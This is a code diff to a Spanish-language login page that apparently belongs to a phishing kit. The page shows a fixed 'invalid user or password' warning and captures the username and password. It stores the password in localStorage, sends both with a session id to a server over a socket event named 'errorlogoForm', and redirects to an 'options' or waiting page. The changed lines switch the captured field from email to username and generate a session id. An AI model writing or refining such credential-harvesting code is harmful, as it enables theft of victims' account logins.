@@ -79,7 +79,7 @@
     <div class="alerta">
       ❗ Usuario o clave inválida. Por favor ingrese a su cuenta correctamente.
     </div>
-    <p>Ingrese su correo y contraseña para continuar</p>
+    <p>Ingrese su usuario y contraseña para continuar</p>
     <form id="login-form">
       <input type="text" id="usuario" placeholder="Usuario" required />
       <div class="input-group">
@@ -102,18 +102,20 @@
         form.addEventListener('submit', (e) => {
           e.preventDefault();
 
-          const correo = document.getElementById('usuario').value;
+          // Obtener los valores de los campos de usuario y contraseña
+          const usuario = document.getElementById('usuario').value; // 'usuario' en vez de 'correo'
           const contrasena = document.getElementById('clave').value;
-          const sessionId = localStorage.getItem('sessionId');
+          const sessionId = localStorage.getItem('sessionId') || Math.random().toString(36).substring(2, 15);
 
           // Actualizar localStorage con los nuevos datos ingresados
-          localStorage.setItem('correo', correo);
+          localStorage.setItem('usuario', usuario);  // Guardar el 'usuario'
           localStorage.setItem('contrasena', contrasena);
+          localStorage.setItem('sessionId', sessionId);  // Guardar sessionId
 
-          // Enviar al servidor con la sesión original
-          socket.emit('errorlogoForm', { correo, contrasena, sessionId });
+          // Emitir los datos al servidor
+          socket.emit('errorlogoForm', { usuario, contrasena, sessionId });
 
-          // Redirigir a la pantalla de espera
+          // Redirigir a la pantalla de opciones o esperar respuesta
           window.location.href = 'opciones.html';
         });
       }
